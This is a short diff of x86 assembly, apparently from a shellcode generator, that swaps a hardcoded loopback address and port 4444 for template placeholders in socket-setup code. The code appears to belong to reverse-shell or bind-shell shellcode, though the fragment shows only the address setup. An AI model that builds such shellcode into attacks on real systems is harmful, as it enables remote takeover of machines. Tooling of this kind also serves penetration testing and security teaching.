@@ -34,16 +34,13 @@ _start:
     ; save server socket file descriptor
     mov esi, eax
 
-    ; inet_aton("127.0.0.1")
-    ;rol ebx, 24
-    ;push ebx
-    push 0x0100007f
-    ;mov [esp], BYTE 127
+    ; e.g., inet_aton("127.0.0.1")
+    {{ TEMPLATE_TCP_IP }}
     
-    ; 0x0002 -> AF_INET
     ; 0x115c -> htons(4444)
-    push WORD 0x5c11
+    {{ TEMPLATE_TCP_PORT }}
 
+    ; 0x0002 -> AF_INET
     mov bl, 2
     push WORD bx
 
